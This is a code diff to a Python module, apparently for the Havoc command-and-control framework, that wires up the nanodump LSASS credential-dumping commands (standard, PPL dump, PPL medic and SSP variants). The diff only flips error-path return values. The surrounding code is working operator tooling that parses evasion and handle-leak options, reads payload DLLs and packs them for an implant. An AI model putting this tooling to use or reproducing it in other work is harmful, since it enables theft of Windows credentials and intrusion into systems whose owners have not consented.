@@ -65,7 +65,7 @@ def nanodump(demonID, *params):
 
     if demon.OSArch.startswith(demon.ProcessArch) is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support WoW64" )
-        return True
+        return False
 
     skip = False
     for i in range(num_params):
@@ -85,19 +85,19 @@ def nanodump(demonID, *params):
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
-                return True
+                return False
             dump_path = params[i + 1]
         elif param == '--pid' or param == '-p':
             # set the PID of LSASS
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --pid value" )
-                return True
+                return False
             try:
                 pid = int(params[i + 1])
             except Exception as e:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid PID: {params[i]}" )
-                return True
+                return False
         elif param == '--fork' or param == '-f':
             # set arg to true for process forking
             fork = True
@@ -115,7 +115,7 @@ def nanodump(demonID, *params):
             duplicate_elevate = True
         elif param == "--seclogon-leak-local" or param == "-sll":
             demon.ConsoleWrite( demon.CONSOLE_ERROR, "sorry, --seclogon-leak-local is not supported right now" )
-            return True
+            return False
             # use MalSecLogon leak local
             use_seclogon_leak_local = True
         elif param == "--seclogon-leak-remote" or param == "-slr":
@@ -124,17 +124,17 @@ def nanodump(demonID, *params):
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --seclogon-leak-remote value" )
-                return True
+                return False
             # decoy binary path
             seclogon_leak_remote_binary = params[i + 1]
             if is_full_path(seclogon_leak_remote_binary) is False:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You must provide a full path: {seclogon_leak_remote_binary}" )
-                return True
+                return False
         elif param == "--silent-process-exit" or param == "-spe":
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --silent-process-exit value" )
-                return True
+                return False
             use_silent_process_exit = True
             silent_process_exit = params[i + 1]
         elif param == "--shtinkering" or param == "-sk":
@@ -142,7 +142,7 @@ def nanodump(demonID, *params):
             #user = beacon_info($1, "user" );
             #if user != "SYSTEM *":
             #    demon.ConsoleWrite( demon.CONSOLE_ERROR, "You must be SYSTEM to run the Shtinkering technique" )
-            #    return True
+            #    return False
             use_lsass_shtinkering = True
         elif param == "--seclogon-duplicate" or param == "-sd":
             # use the seclogon race condition to dup an LSASS handle
@@ -151,7 +151,7 @@ def nanodump(demonID, *params):
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --spoof-callstack value" )
-                return True
+                return False
             if params[i + 1] == "svchost":
                 spoof_callstack = 1
             elif params[i + 1] == "wmi":
@@ -160,7 +160,7 @@ def nanodump(demonID, *params):
                 spoof_callstack = 3
             else:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "invalid --spoof-callstack value" )
-                return True
+                return False
         elif param == "--help" or param == "-h":
             demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\Windows\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
@@ -200,10 +200,10 @@ def nanodump(demonID, *params):
             demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
-            return True
+            return False
         else:
             demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
-            return True
+            return False
 
     if write_file is False:
         dump_path = f'{int(time.time())}_lsass.dmp'
@@ -213,122 +213,122 @@ def nanodump(demonID, *params):
          use_seclogon_duplicate or spoof_callstack or use_seclogon_leak_local or
          use_seclogon_leak_remote or dup or use_silent_process_exit or use_lsass_shtinkering):
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The parameter --getpid is used alone" )
-        return True
+        return False
 
     if use_silent_process_exit and \
         (write_file or use_valid_sig or snapshot or fork or elevate_handle or duplicate_elevate or
          use_seclogon_duplicate or spoof_callstack or use_seclogon_leak_local or
          use_seclogon_leak_remote or dup or use_lsass_shtinkering):
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The parameter --silent-process-exit is used alone" )
-        return True
+        return False
 
     if fork and snapshot:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --fork and --snapshot cannot be used together" )
-        return True
+        return False
 
     if dup and elevate_handle:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --elevate-handle cannot be used together" )
-        return True
+        return False
 
     if duplicate_elevate and spoof_callstack:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --spoof-callstack cannot be used together" )
-        return True
+        return False
 
     if dup and spoof_callstack:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --spoof-callstack cannot be used together" )
-        return True
+        return False
 
     if dup and use_seclogon_duplicate:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --seclogon-duplicate cannot be used together" )
-        return True
+        return False
 
     if elevate_handle and duplicate_elevate:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --duplicate-elevate cannot be used together" )
-        return True
+        return False
 
     if duplicate_elevate and dup:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --duplicate cannot be used together" )
-        return True
+        return False
 
     if duplicate_elevate and use_seclogon_duplicate:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --seclogon-duplicate cannot be used together" )
-        return True
+        return False
 
     if elevate_handle and use_seclogon_duplicate:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --seclogon-duplicate cannot be used together" )
-        return True
+        return False
 
     if dup and use_seclogon_leak_local:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --seclogon-leak-local cannot be used together" )
-        return True
+        return False
 
     if duplicate_elevate and use_seclogon_leak_local:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --seclogon-leak-local cannot be used together" )
-        return True
+        return False
 
     if elevate_handle and use_seclogon_leak_local:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --seclogon-leak-local cannot be used together" )
-        return True
+        return False
 
     if dup and use_seclogon_leak_remote:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --seclogon-leak-remote cannot be used together" )
-        return True
+        return False
 
     if duplicate_elevate and use_seclogon_leak_remote:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --seclogon-leak-remote cannot be used together" )
-        return True
+        return False
 
     if elevate_handle and use_seclogon_leak_remote:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --seclogon-leak-remote cannot be used together" )
-        return True
+        return False
 
     if use_seclogon_leak_local and use_seclogon_leak_remote:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-local and --seclogon-leak-remote cannot be used together" )
-        return True
+        return False
 
     if use_seclogon_leak_local and use_seclogon_duplicate:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-local and --seclogon-duplicate cannot be used together" )
-        return True
+        return False
 
     if use_seclogon_leak_local and spoof_callstack:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-local and --spoof-callstack cannot be used together" )
-        return True
+        return False
 
     if use_seclogon_leak_remote and use_seclogon_duplicate:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-remote and --seclogon-duplicate cannot be used together" )
-        return True
+        return False
 
     if use_seclogon_leak_remote and spoof_callstack:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-remote and --spoof-callstack cannot be used together" )
-        return True
+        return False
 
     if use_seclogon_duplicate and spoof_callstack:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-duplicate and --spoof-callstack cannot be used together" )
-        return True
+        return False
 
     if use_lsass_shtinkering is False and use_seclogon_leak_local and write_file is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "If --seclogon-leak-local is being used, you need to provide the dump path with --write" )
-        return True
+        return False
 
     if use_lsass_shtinkering is False and use_seclogon_leak_local and is_full_path(dump_path) is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, f"If --seclogon-leak-local is being used, you need to provide the full path: {dump_path}" )
-        return True
+        return False
 
     if use_lsass_shtinkering and fork:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --fork cannot be used together" )
-        return True
+        return False
 
     if use_lsass_shtinkering and snapshot:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --snapshot cannot be used together" )
-        return True
+        return False
 
     if use_lsass_shtinkering and use_valid_sig:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --valid cannot be used together" )
-        return True
+        return False
 
     if use_lsass_shtinkering and write_file:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --write cannot be used together" )
-        return True
+        return False
 
     """
     if use_seclogon_leak_local:
@@ -386,17 +386,17 @@ def nanodump_ppl_dump(demonID, *params):
 
     if demon.ProcessArch == "x86":
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support x86" )
-        return True
+        return False
 
     if demon.OSArch.startswith(demon.ProcessArch) is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support WoW64" )
-        return True
+        return False
 
     with open(f'bin/nanodump_ppl_dump.{demon.ProcessArch}.dll', 'rb') as f:
         dll = f.read()
     if len(dll) == 0:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
-        return True
+        return False
 
     skip = False
     for i in range(num_params):
@@ -413,7 +413,7 @@ def nanodump_ppl_dump(demonID, *params):
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
-                return True
+                return False
             dump_path = params[i + 1]
         elif param == '--duplicate' or param == '-d':
             # set arg to true for handle duplication
@@ -431,18 +431,18 @@ def nanodump_ppl_dump(demonID, *params):
             demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
-            return True
+            return False
         else:
             demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
-            return True
+            return False
 
     if write_file is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write" )
-        return True
+        return False
 
     if is_full_path(dump_path) is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {dump_path}" )
-        return True
+        return False
 
     packer.addstr(dump_path)
     packer.addbool(use_valid_sig)
@@ -470,17 +470,17 @@ def nanodump_ppl_medic(demonID, *params):
 
     if demon.ProcessArch == "x86":
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support x86" )
-        return True
+        return False
 
     if demon.OSArch.startswith(demon.ProcessArch) is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support WoW64" )
-        return True
+        return False
 
     with open(f'bin/nanodump_ppl_medic.{demon.ProcessArch}.dll', 'rb') as f:
         dll = f.read()
     if len(dll) == 0:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
-        return True
+        return False
 
     skip = False
     for i in range(num_params):
@@ -497,7 +497,7 @@ def nanodump_ppl_medic(demonID, *params):
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
-                return True
+                return False
             dump_path = params[i + 1]
         elif param == '--elevate-handle' or param == '-d':
             # set arg to true for handle elevation
@@ -515,18 +515,18 @@ def nanodump_ppl_medic(demonID, *params):
             demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
-            return True
+            return False
         else:
             demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
-            return True
+            return False
 
     if write_file is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write" )
-        return True
+        return False
 
     if is_full_path(dump_path) is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {dump_path}" )
-        return True
+        return False
 
     packer.addbytes(dll)
     packer.addstr(dump_path)
@@ -556,11 +556,11 @@ def nanodump_ssp(demonID, *params):
 
     if demon.ProcessArch == "x86":
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support x86" )
-        return True
+        return False
 
     if demon.OSArch.startswith(demon.ProcessArch) is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support WoW64" )
-        return True
+        return False
 
     skip = False
     for i in range(num_params):
@@ -577,19 +577,19 @@ def nanodump_ssp(demonID, *params):
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
-                return True
+                return False
             dump_path = params[i + 1]
         elif param == '--write-dll' or param == '-wdll':
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write-dll value" )
-                return True
+                return False
             write_dll_path = params[i + 1]
         elif param == '--load-dll' or param == '-ldll':
             skip = True
             if i + 1 >= num_params:
                 demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --load-dll value" )
-                return True
+                return False
             load_path = params[i + 1]
         elif param == "--help" or param == "-h":
             demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump_ssp --write C:\\Windows\\Temp\\doc.docx [--valid] [--write-dll C:\\Windows\\Temp\\ssp.dll] [--load-dll C:\\Windows\\Temp\\ssp.dll] [--help]" )
@@ -606,33 +606,33 @@ def nanodump_ssp(demonID, *params):
             demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
-            return True
+            return False
         else:
             demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
-            return True
+            return False
 
     if write_file is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write" )
-        return True
+        return False
 
     if is_full_path(dump_path) is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {dump_path}" )
-        return True
+        return False
 
     if load_path != '' and write_dll_path != '':
         demon.ConsoleWrite( demon.CONSOLE_ERROR, f"The options --write-dll and --load-dll cannot be used together" )
-        return True
+        return False
 
     if load_path != '' and is_full_path(load_path) is False:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {load_path}" )
-        return True
+        return False
 
     if load_path == '':
         with open(f'bin/nanodump_ssp.{demon.ProcessArch}.dll', 'rb') as f:
             nanodump_ssp_dll = f.read()
         if len(nanodump_ssp_dll) == 0:
             demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
-            return True
+            return False
 
     packer.addbytes(nanodump_ssp_dll)
     packer.addstr(write_dll_path)
